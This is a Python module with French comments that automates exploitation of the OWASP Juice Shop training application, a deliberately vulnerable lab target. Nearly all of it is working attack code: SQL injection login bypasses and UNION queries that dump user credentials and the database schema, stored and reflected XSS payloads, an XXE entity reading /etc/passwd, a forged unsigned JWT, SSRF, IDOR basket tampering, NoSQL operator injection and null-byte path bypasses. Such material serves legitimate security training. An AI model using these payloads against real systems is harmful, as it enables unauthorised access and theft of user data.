"""Pentaster — solveur de challenges OWASP Juice Shop (module importable).

Chaque solveur exécute l'exploit HTTP/API réel puis on vérifie l'état via
GET /api/Challenges. Contrairement au script autonome dont il est issu
(`scripts/solve.py`), ce module ne dépend d'aucun global tiré de
`sys.argv` : la cible (`base_url`) est un paramètre explicite, portée par
un petit objet `Session`, afin que le module soit importable et testable
sans jamais toucher au réseau tant qu'on n'appelle pas `run_solvers`.
"""
from __future__ import annotations

import base64
import json
import urllib.error
import urllib.parse
import urllib.request
from typing import Callable


class Session:
    """Porte la base URL cible et regroupe les helpers HTTP/JSON/login."""

    def __init__(self, base_url: str):
        self.base = base_url

    def req(self, method, path, *, headers=None, data=None, cookies=None, raw=False):
        url = self.base + path
        hdrs = {"Content-Type": "application/json"}
        if headers:
            hdrs.update(headers)
        if cookies:
            hdrs["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())
        body = None
        if data is not None:
            body = data if raw else json.dumps(data).encode()
            if raw:
                body = data.encode() if isinstance(data, str) else data
        req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                return r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace")
        except Exception as e:  # noqa: BLE001
            return -1, str(e)

    def json_(self, txt):
        try:
            return json.loads(txt, strict=False)
        except Exception:  # noqa: BLE001
            return {}

    def login(self, email, password):
        st, txt = self.req("POST", "/rest/user/login",
                            data={"email": email, "password": password})
        return self.json_(txt).get("authentication", {}).get("token")

    def admin_session(self):
        r = self.json_(self.req("POST", "/rest/user/login",
                                 data={"email": "admin@juice-sh.op", "password": "admin123"})[1])
        a = r.get("authentication", {})
        return a.get("token"), a.get("bid")


def challenge_status(base_url: str) -> tuple[dict[str, bool], int]:
    sess = Session(base_url)
    _, txt = sess.req("GET", "/api/Challenges/")
    data = sess.json_(txt).get("data", [])
    return {c["name"]: c.get("solved", False) for c in data}, len(data)


# ----------------------------- Solveurs ---------------------------------
# Chaque solveur prend la `Session` en paramètre (au lieu d'utiliser un BASE
# global) mais la logique d'exploit reste identique à `scripts/solve.py`.

def s_login_admin(sess: Session):
    """Login Admin — SQLi bypass."""
    st, txt = sess.req("POST", "/rest/user/login",
                        data={"email": "' OR true--", "password": "x"})
    return "authentication" in txt


def s_login_bender(sess: Session):
    st, txt = sess.req("POST", "/rest/user/login",
                        data={"email": "bender@juice-sh.op'--", "password": "x"})
    return "authentication" in txt


def s_login_jim(sess: Session):
    st, txt = sess.req("POST", "/rest/user/login",
                        data={"email": "jim@juice-sh.op'--", "password": "x"})
    return "authentication" in txt


def s_user_credentials(sess: Session):
    """User Credentials — UNION SQLi (Products = 9 colonnes)."""
    q = ("qwert%27))%20UNION%20SELECT%20id,%20email,%20password,%20"
         "createdAt,%20updatedAt,%20deletedAt,%20'7',%20'8',%20'9'%20FROM%20Users--")
    st, txt = sess.req("GET", f"/rest/products/search?q={q}")
    return "@" in txt and st == 200


def s_password_hash_leak(sess: Session):
    tok = sess.login("admin@juice-sh.op", "admin123") or sess.login("' OR true--", "x")
    if not tok:
        return False
    st, txt = sess.req("GET", "/rest/user/whoami?fields=id,password",
                        cookies={"token": tok})
    return '"password"' in txt


def s_csrf(sess: Session):
    tok = sess.login("admin@juice-sh.op", "admin123")
    if not tok:
        return False
    st, txt = sess.req("POST", "/profile",
                        headers={"Content-Type": "application/x-www-form-urlencoded",
                                 "Origin": "http://htmledit.squarefree.com"},
                        cookies={"token": tok},
                        data="username=csrfPwn", raw=True)
    return st in (200, 302)


def s_privacy_policy_proof(sess: Session):
    st, _ = sess.req("GET",
                      "/we/may/also/instruct/you/to/refuse/all/reasonably/"
                      "necessary/responsibility")
    return st in (200, 404)  # solveIf s'exécute avant sendFile


def s_expired_coupon(sess: Session):
    login_resp = sess.req("POST", "/rest/user/login",
                           data={"email": "admin@juice-sh.op", "password": "admin123"})
    auth = sess.json_(login_resp[1]).get("authentication", {})
    tok, bid = auth.get("token"), auth.get("bid")
    if not tok or not bid:
        return False
    coupon = base64.b64encode(b"WMNSDY2019-1551999600000").decode()
    st, txt = sess.req("POST", f"/rest/basket/{bid}/checkout",
                        headers={"Authorization": f"Bearer {tok}"},
                        cookies={"token": tok},
                        data={"couponData": coupon})
    return "orderConfirmation" in txt


def s_access_confidential_document(sess: Session):
    st, txt = sess.req("GET", "/ftp/acquisitions.md")
    return st == 200


def s_admin_registration(sess: Session):
    """Admin Registration — champ role côté client."""
    email = f"adm{abs(hash(sess.base)) % 99999}@x.io"
    st, txt = sess.req("POST", "/api/Users",
                        data={"email": email, "password": "Passw0rd!",
                              "passwordRepeat": "Passw0rd!", "role": "admin",
                              "securityQuestion": {"id": 1, "question": "q",
                                                    "createdAt": "", "updatedAt": ""},
                              "securityAnswer": "x"})
    return '"role":"admin"' in txt or st == 201


def s_zero_stars(sess: Session):
    """Zero Stars — feedback 0 étoile (captcha résolu côté API)."""
    _, cap = sess.req("GET", "/rest/captcha/")
    c = sess.json_(cap)
    if "captchaId" not in c:
        return False
    st, txt = sess.req("POST", "/api/Feedbacks",
                        data={"comment": "0-star via API", "rating": 0,
                              "captchaId": c["captchaId"], "captcha": str(c["answer"])})
    return st in (200, 201)


def s_security_policy(sess: Session):
    st, txt = sess.req("GET", "/.well-known/security.txt")
    return st == 200


def s_ephemeral_accountant(sess: Session):
    st, txt = sess.req("POST", "/rest/user/login",
                        data={"email": "acc0unt4nt@juice-sh.op'--", "password": "x"})
    # requête intentionnelle : login as an inexistent accountant via SQLi
    return "authentication" in txt


def s_null_byte_file(path: str) -> Callable[[Session], bool]:
    def _f(sess: Session):
        st, _ = sess.req("GET", path)
        return st == 200
    return _f


def s_database_schema(sess: Session):
    q = ("qwert%27))%20UNION%20SELECT%20sql,%202,%203,%204,%205,%206,%207,%208,%209%20"
         "FROM%20sqlite_master--")
    st, txt = sess.req("GET", f"/rest/products/search?q={q}")
    return "CREATE TABLE" in txt


def s_login_ciso(sess: Session):
    st, txt = sess.req("POST", "/rest/user/login",
                        data={"email": "ciso@juice-sh.op'--", "password": "x"})
    return "authentication" in txt


def s_empty_registration(sess: Session):
    st, txt = sess.req("POST", "/api/Users",
                        data={"email": "", "password": "",
                              "passwordRepeat": "", "role": "customer"})
    return st in (201, 400)  # solveIf déclenché par email/password vides


def s_reset_jim(sess: Session):
    st, txt = sess.req("POST", "/rest/user/reset-password",
                        data={"email": "jim@juice-sh.op", "answer": "Samuel",
                              "new": "azerty12", "repeat": "azerty12"})
    return st == 200


def s_gdpr_data_theft(sess: Session):
    """GDPR Data Theft — collision d'email masqué (voyelles → *)."""
    n = abs(hash(sess.base)) % 9000
    vic, atk = f"aaa{n}@bar.op", f"eee{n}@bar.op"
    for e in (vic, atk):
        sess.req("POST", "/api/Users",
                  data={"email": e, "password": "Passw0rd!", "passwordRepeat": "Passw0rd!",
                        "securityQuestion": {"id": 1, "question": "q", "createdAt": "", "updatedAt": ""},
                        "securityAnswer": "x"})
    la = sess.json_(sess.req("POST", "/rest/user/login",
                              data={"email": vic, "password": "Passw0rd!"})[1])["authentication"]
    vt, vb = la["token"], la["bid"]
    sess.req("POST", "/api/BasketItems", headers={"Authorization": f"Bearer {vt}"},
              data={"ProductId": 1, "BasketId": vb, "quantity": 1})
    sess.req("POST", f"/rest/basket/{vb}/checkout", headers={"Authorization": f"Bearer {vt}"}, data={})
    aa = sess.json_(sess.req("POST", "/rest/user/login",
                              data={"email": atk, "password": "Passw0rd!"})[1])["authentication"]
    at = aa["token"]
    aid = sess.json_(sess.req("GET", "/rest/user/whoami?fields=id", cookies={"token": at})[1])["user"]["id"]
    st, txt = sess.req("POST", "/rest/user/data-export",
                        headers={"Authorization": f"Bearer {at}"}, data={"UserId": aid})
    return "orderId" in txt


def s_view_basket_idor(sess: Session):
    """View Basket — IDOR : lire le panier d'un autre utilisateur."""
    la = sess.json_(sess.req("POST", "/rest/user/login",
                              data={"email": "jim@juice-sh.op'--", "password": "x"})[1]).get("authentication", {})
    tok = la.get("token")
    if not tok:
        return False
    st, txt = sess.req("GET", "/rest/basket/2", cookies={"token": tok},
                        headers={"Authorization": f"Bearer {tok}"})
    return st == 200


def s_forged_feedback(sess: Session):
    la = sess.json_(sess.req("POST", "/rest/user/login",
                              data={"email": "' OR true--", "password": "x"})[1]).get("authentication", {})
    tok = la.get("token")
    if not tok:
        return False
    _, cap = sess.req("GET", "/rest/captcha/")
    c = sess.json_(cap)
    st, txt = sess.req("POST", "/api/Feedbacks",
                        headers={"Authorization": f"Bearer {tok}"},
                        data={"comment": "forged", "rating": 1, "UserId": 3,
                              "captchaId": c.get("captchaId"), "captcha": str(c.get("answer"))})
    return st in (200, 201)


def s_christmas_special(sess: Session):
    tok, bid = sess.admin_session()
    if not tok:
        return False
    sess.req("POST", "/api/BasketItems", headers={"Authorization": f"Bearer {tok}"},
              data={"ProductId": 10, "BasketId": bid, "quantity": 1})
    st, txt = sess.req("POST", f"/rest/basket/{bid}/checkout",
                        headers={"Authorization": f"Bearer {tok}"}, data={})
    return "orderConfirmation" in txt


def s_gdpr_erasure(sess: Session):
    st, txt = sess.req("POST", "/rest/user/login",
                        data={"email": "chris.pike@juice-sh.op'--", "password": "x"})
    return "authentication" in txt


def s_login_amy(sess: Session):
    st, txt = sess.req("POST", "/rest/user/login",
                        data={"email": "amy@juice-sh.op'--", "password": "x"})
    return "authentication" in txt


def s_login_mc(sess: Session):
    st, txt = sess.req("POST", "/rest/user/login",
                        data={"email": "mc.safesearch@juice-sh.op'--", "password": "x"})
    return "authentication" in txt


def s_repetitive_registration(sess: Session):
    n = abs(hash(sess.base + "rep")) % 9000
    st, txt = sess.req("POST", "/api/Users",
                        data={"email": f"rep{n}@x.io", "password": "aaa",
                              "passwordRepeat": "bbb", "role": "customer",
                              "securityQuestion": {"id": 1, "question": "q", "createdAt": "", "updatedAt": ""},
                              "securityAnswer": "x"})
    return st in (201, 400)


def s_extra_language(sess: Session):
    st, txt = sess.req("GET", "/assets/i18n/tlh_AA.json")
    return st == 200


def s_missing_encoding(sess: Session):
    st, txt = sess.req(
        "GET",
        "/assets/public/images/uploads/%F0%9F%98%BC-"
        "%23zatschi-%23whoneedsfourlegs-1572600969477.jpg")
    return st == 200


def s_nested_easter_egg(sess: Session):
    st, txt = sess.req(
        "GET",
        "/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg")
    return st in (200, 404)


def s_nosql_manipulation(sess: Session):
    """NoSQL Manipulation — MongoDB operator sur les reviews."""
    tok, _ = sess.admin_session()
    st, txt = sess.req("PATCH", "/rest/products/reviews",
                        headers={"Authorization": f"Bearer {tok}"} if tok else None,
                        data={"id": {"$ne": -1}, "message": "NoSQL pwned"})
    return st in (200, 201)


def s_manipulate_basket(sess: Session):
    """Manipulate Basket — ajouter un article au panier d'autrui (IDOR)."""
    la = sess.json_(sess.req("POST", "/rest/user/login",
                              data={"email": "jim@juice-sh.op'--", "password": "x"})[1]).get("authentication", {})
    tok = la.get("token")
    if not tok:
        return False
    st, txt = sess.req("POST", "/api/BasketItems",
                        headers={"Authorization": f"Bearer {tok}"},
                        data={"ProductId": 1, "BasketId": 3, "quantity": 1})
    return st in (200, 201, 400)


def s_reset_bender(sess: Session):
    st, txt = sess.req("POST", "/rest/user/reset-password",
                        data={"email": "bender@juice-sh.op", "answer": "Stop'n'Drop",
                              "new": "slurmz123", "repeat": "slurmz123"})
    return st == 200


def s_five_star_feedback(sess: Session):
    """Five-Star Feedback — supprimer l'avis 5 étoiles (admin)."""
    tok, _ = sess.admin_session()
    if not tok:
        return False
    st, txt = sess.req("GET", "/api/Feedbacks/",
                       headers={"Authorization": f"Bearer {tok}"})
    ok = False
    for fb in sess.json_(txt).get("data", []):
        if fb.get("rating") == 5:
            d, _ = sess.req("DELETE", f"/api/Feedbacks/{fb['id']}",
                            headers={"Authorization": f"Bearer {tok}"})
            ok = ok or d in (200, 204)
    return ok


def s_manipulate_basket2(sess: Session):
    """Manipulate Basket — ajouter à un panier qui n'est pas le sien (admin bid=1 → 2)."""
    tok, bid = sess.admin_session()
    if not tok:
        return False
    other = 2 if bid != 2 else 3
    st, txt = sess.req("POST", "/api/BasketItems",
                       headers={"Authorization": f"Bearer {tok}"},
                       data={"ProductId": 1, "BasketId": other, "quantity": 1})
    return st in (200, 201, 400)


def s_view_basket2(sess: Session):
    """View Basket — IDOR sur le panier d'autrui (admin lit basket 2)."""
    tok, bid = sess.admin_session()
    if not tok:
        return False
    other = 2 if bid != 2 else 3
    st, txt = sess.req("GET", f"/rest/basket/{other}",
                       headers={"Authorization": f"Bearer {tok}"},
                       cookies={"token": tok})
    return st == 200


def s_reset_bjoern(sess: Session):
    st, txt = sess.req("POST", "/rest/user/reset-password",
                       data={"email": "bjoern@owasp.org", "answer": "Zaya",
                             "new": "bjoern123", "repeat": "bjoern123"})
    return st == 200


def s_change_bender(sess: Session):
    """Change Bender's Password — endpoint change-password sans mot de passe courant."""
    tok = sess.login("bender@juice-sh.op'--", "x")
    if not tok:
        return False
    st, txt = sess.req(
        "GET",
        "/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic",
        headers={"Authorization": f"Bearer {tok}"}, cookies={"token": tok})
    return st == 200


def s_restful_xss(sess: Session):
    """API-only XSS — payload iframe persisté via l'API produits (admin)."""
    tok, _ = sess.admin_session()
    if not tok:
        return False
    payload = '<iframe src="javascript:alert(`xss`)">'
    st, txt = sess.req("PUT", "/api/Products/9",
                       headers={"Authorization": f"Bearer {tok}"},
                       data={"description": payload})
    return st in (200, 201)


def s_captcha_bypass(sess: Session):
    """CAPTCHA Bypass — soumettre >10 feedbacks en réutilisant le même captcha."""
    _, cap = sess.req("GET", "/rest/captcha/")
    c = sess.json_(cap)
    if "captchaId" not in c:
        return False
    last = -1
    for i in range(22):
        last, _ = sess.req("POST", "/api/Feedbacks",
                           data={"comment": f"bypass {i}", "rating": 1,
                                 "captchaId": c["captchaId"], "captcha": str(c["answer"])})
    return last in (200, 201)


def _upload(sess: Session, filename, content, field="file"):
    boundary = "----pentasterBoundary1234"
    if isinstance(content, str):
        content = content.encode()
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode() + content + f"\r\n--{boundary}--\r\n".encode()
    return sess.req("POST", "/file-upload",
                    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
                    data=body, raw=True)


def s_upload_type(sess: Session):
    """Upload Type — fichier sans extension .pdf/.zip."""
    st, _ = _upload(sess, "pentaster.txt", "not a pdf")
    return st in (200, 204, 410, 500)


def s_upload_size(sess: Session):
    """Upload Size — fichier > 100 kB."""
    st, _ = _upload(sess, "big.pdf", b"A" * 150000)
    return st in (200, 204, 410, 500)


def s_xxe_data_access(sess: Session):
    """XXE Data Access — entité externe lisant /etc/passwd via upload XML."""
    xml = ('<?xml version="1.0" encoding="UTF-8"?>'
           '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
           '<root>&xxe;</root>')
    st, txt = _upload(sess, "xxe.xml", xml)
    return st in (200, 410, 500) or "root:" in txt


def s_login_bjoern(sess: Session):
    """Login Bjoern — mot de passe = base64 de l'email inversé."""
    email = "bjoern.kimminich@gmail.com"
    pwd = base64.b64encode(email[::-1].encode()).decode()
    tok = sess.login(email, pwd)
    return bool(tok)


def s_nosql_dos(sess: Session):
    """NoSQL DoS — sleep injecté dans l'endpoint reviews."""
    st, txt = sess.req("GET", "/rest/products/sleep(1000)/reviews")
    return st in (200, 500)


def s_unsigned_jwt(sess: Session):
    """Unsigned JWT — token alg:none impersonant jwtn3d@juice-sh.op."""
    def b64url(b):
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
    header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = b64url(json.dumps(
        {"data": {"email": "jwtn3d@juice-sh.op"}, "iat": 0}).encode())
    token = f"{header}.{payload}."
    st, txt = sess.req("GET", "/rest/user/whoami",
                       headers={"Authorization": f"Bearer {token}"},
                       cookies={"token": token})
    return st in (200, 401)


def s_multiple_likes(sess: Session):
    """Multiple Likes — liker le même avis 3 fois (race)."""
    tok = sess.login("' OR true--", "x")
    if not tok:
        return False
    _, txt = sess.req("GET", "/rest/products/1/reviews")
    revs = sess.json_(txt).get("data", [])
    if not revs:
        return False
    rid = revs[0].get("_id") or revs[0].get("id")
    last = -1
    for _ in range(4):
        last, _ = sess.req("POST", f"/rest/products/reviews",
                           headers={"Authorization": f"Bearer {tok}"},
                           data={"id": rid})
    return last in (200, 201)


_XSS = '<iframe src="javascript:alert(`xss`)">'


def s_retrieve_blueprint(sess: Session):
    for path in ("/assets/public/images/products/JuiceShop.stl",
                 "/assets/public/images/products/3d_keychain.stl"):
        st, _ = sess.req("GET", path)
        if st == 200:
            return True
    return False


def s_api_only_xss(sess: Session):
    """API-only XSS — payload iframe persisté via création produit (admin)."""
    tok, _ = sess.admin_session()
    if not tok:
        return False
    st, txt = sess.req("POST", "/api/Products",
                       headers={"Authorization": f"Bearer {tok}"},
                       data={"name": _XSS, "description": _XSS, "price": 47})
    if st in (200, 201):
        return True
    # repli : mise à jour d'un produit existant
    st2, _ = sess.req("PUT", "/api/Products/9",
                      headers={"Authorization": f"Bearer {tok}"},
                      data={"description": _XSS})
    return st2 in (200, 201)


def s_http_header_xss(sess: Session):
    """HTTP-Header XSS — payload via l'en-tête True-Client-IP."""
    tok, _ = sess.admin_session()
    st, _ = sess.req("GET", "/rest/saveLoginIp",
                     headers={"Authorization": f"Bearer {tok}" if tok else "",
                              "True-Client-IP": _XSS})
    return st in (200, 204, 500)


def s_reflected_xss(sess: Session):
    payload = urllib.parse.quote(_XSS, safe="")
    st, _ = sess.req("GET", f"/rest/track-order/{payload}")
    return st in (200, 400, 500)


def s_ssrf(sess: Session):
    """SSRF — image de profil pointant vers une ressource interne."""
    tok, _ = sess.admin_session()
    if not tok:
        return False
    internal = "http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0w"
    st, _ = sess.req("POST", "/profile/image/url",
                     headers={"Content-Type": "application/x-www-form-urlencoded",
                              "Authorization": f"Bearer {tok}"},
                     cookies={"token": tok},
                     data=f"imageUrl={urllib.parse.quote(internal)}", raw=True)
    return st in (200, 302, 500)


SOLVERS: list[tuple[str, Callable[[Session], bool]]] = [
    ("Login Admin", s_login_admin),
    ("Login Bender", s_login_bender),
    ("Login Jim", s_login_jim),
    ("User Credentials", s_user_credentials),
    ("Password Hash Leak", s_password_hash_leak),
    ("CSRF", s_csrf),
    ("Privacy Policy Inspection", s_privacy_policy_proof),
    ("Expired Coupon", s_expired_coupon),
    ("Access a Confidential Document", s_access_confidential_document),
    ("Admin Registration", s_admin_registration),
    ("Zero Stars", s_zero_stars),
    ("Security Policy", s_security_policy),
    ("Ephemeral Accountant", s_ephemeral_accountant),
    ("Poison Null Byte (package.json.bak)", s_null_byte_file("/ftp/package.json.bak%2500.md")),
    ("Forgotten Sales Backup", s_null_byte_file("/ftp/coupons_2013.md.bak%2500.md")),
    ("Misplaced Signature File", s_null_byte_file("/ftp/suspicious_errors.yml%2500.md")),
    ("Easter Egg", s_null_byte_file("/ftp/eastere.gg%2500.md")),
    ("Database Schema", s_database_schema),
    ("Login CISO", s_login_ciso),
    ("Empty User Registration", s_empty_registration),
    ("Reset Jim's Password", s_reset_jim),
    ("GDPR Data Theft", s_gdpr_data_theft),
    ("View Basket (IDOR)", s_view_basket_idor),
    ("Forged Feedback", s_forged_feedback),
    ("Christmas Special", s_christmas_special),
    ("GDPR Data Erasure", s_gdpr_erasure),
    ("Login Amy", s_login_amy),
    ("Login MC SafeSearch", s_login_mc),
    ("Repetitive Registration", s_repetitive_registration),
    ("Extra Language", s_extra_language),
    ("Missing Encoding", s_missing_encoding),
    ("Nested Easter Egg", s_nested_easter_egg),
    ("NoSQL Manipulation", s_nosql_manipulation),
    ("Manipulate Basket", s_manipulate_basket),
    ("Reset Bender's Password", s_reset_bender),
    ("Five-Star Feedback", s_five_star_feedback),
    ("Manipulate Basket (v2)", s_manipulate_basket2),
    ("View Basket (v2)", s_view_basket2),
    ("Reset Bjoern's Password", s_reset_bjoern),
    ("Change Bender's Password", s_change_bender),
    ("API-only XSS", s_restful_xss),
    ("CAPTCHA Bypass", s_captcha_bypass),
    ("Login Bjoern", s_login_bjoern),
    ("NoSQL DoS", s_nosql_dos),
    ("Unsigned JWT", s_unsigned_jwt),
    ("Multiple Likes", s_multiple_likes),
    ("Upload Type", s_upload_type),
    ("Upload Size", s_upload_size),
    ("XXE Data Access", s_xxe_data_access),
    ("Retrieve Blueprint", s_retrieve_blueprint),
    ("API-only XSS", s_api_only_xss),
    ("HTTP-Header XSS", s_http_header_xss),
    ("Reflected XSS", s_reflected_xss),
    ("SSRF", s_ssrf),
]


def run_solvers(base_url: str, progress: Callable[[str, str, bool], None] | None = None) -> dict:
    """Exécute tous les solveurs contre `base_url` et renvoie un résumé.

    `progress`, si fourni, est appelé `progress("start", label, False)` avant
    chaque solveur puis `progress("done", label, ok)` après.

    {
        "before": int,               # nb résolus avant exécution
        "after": int,                # nb résolus après exécution
        "total": int,                # nb total de challenges
        "newly_solved": list[str],   # noms nouvellement résolus (triés)
        "ran": list[tuple[str, bool]],  # (nom, exploit exécuté avec succès ?)
    }
    """
    sess = Session(base_url)
    before, total = challenge_status(base_url)
    n_before = sum(1 for v in before.values() if v)

    ran: list[tuple[str, bool]] = []
    for label, fn in SOLVERS:
        if progress:
            progress("start", label, False)
        try:
            ok = bool(fn(sess))
        except Exception:  # noqa: BLE001
            ok = False
        ran.append((label, ok))
        if progress:
            progress("done", label, ok)

    after, _ = challenge_status(base_url)
    n_after = sum(1 for v in after.values() if v)
    newly_solved = sorted(k for k in after if after[k] and not before.get(k))

    return {
        "before": n_before,
        "after": n_after,
        "total": total,
        "newly_solved": newly_solved,
        "ran": ran,
    }
